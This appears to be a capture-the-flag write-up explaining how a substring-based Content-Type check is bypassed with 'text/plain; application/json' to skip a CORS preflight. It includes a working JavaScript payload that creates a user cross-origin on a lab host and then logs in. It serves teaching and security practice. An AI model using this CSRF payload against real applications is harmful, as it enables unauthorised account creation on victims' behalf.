cors-medium
======================

The `POST /chal3/create-user` endpoint now validates that the 
user sends a `Content-Type` header containing `application/json`.

```python
if "application/json" not in request.headers.get("Content-Type", ""):
    return jsonify({"error": "expected application/json"}), 415
payload = json.loads(request.get_data())
```

So the idea from the previous challenge doesn't seem to work anymore:

- `Content-Type: application/json`, passes the check but requires a preflight.
- `Content-Type: text/plain` doesn't require a preflight but fails the check.

The trick is that the Content-Type header is interpreted differently by the application and the browser. The server does a substring match over the raw value, but the browser parses the value as a MIME type and checks the [essence](https://mimesniff.spec.whatwg.org/#mime-type-miscellaneous) only (the `type/subtype` at the beginning). So we can smuggle `application/json` in the MIME type parameters (the part after the semicolon) to satisfy the application's content type check, whilst appearing to the browser that we're sending a `text/plain` request.

```html
<script>
  (async () => {
    await fetch("http://app.example.com/chal3/create-user", {
      method: "POST",
      headers: {
        "Content-Type": "text/plain; application/json",
      },
      body: JSON.stringify({ username: "jlkqb7b", password: "ty3gqnk" }),
    }).catch(() => {});

    const r = await fetch("http://app.example.com/chal3/login", {
      method: "POST",
      body: new URLSearchParams({ username: "jlkqb7b", password: "ty3gqnk" }),
    });
    console.log(await r.text());
  })();
</script>
```

